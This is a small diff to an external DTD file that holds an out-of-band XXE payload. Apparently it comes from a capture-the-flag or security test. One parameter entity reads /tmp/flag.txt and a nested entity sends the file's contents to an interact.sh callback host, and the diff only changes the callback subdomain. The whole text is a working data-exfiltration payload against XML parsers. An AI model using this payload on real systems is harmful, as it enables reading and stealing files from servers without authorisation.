@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://c3w3z85yedf0000yknwggb6b9wyyyyyyb.interact.sh/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://c3w43bnyedf0000a15m0gb6nbiayyyyyb.interact.sh/%file;'>">
 %eval;
 %exfiltrate;
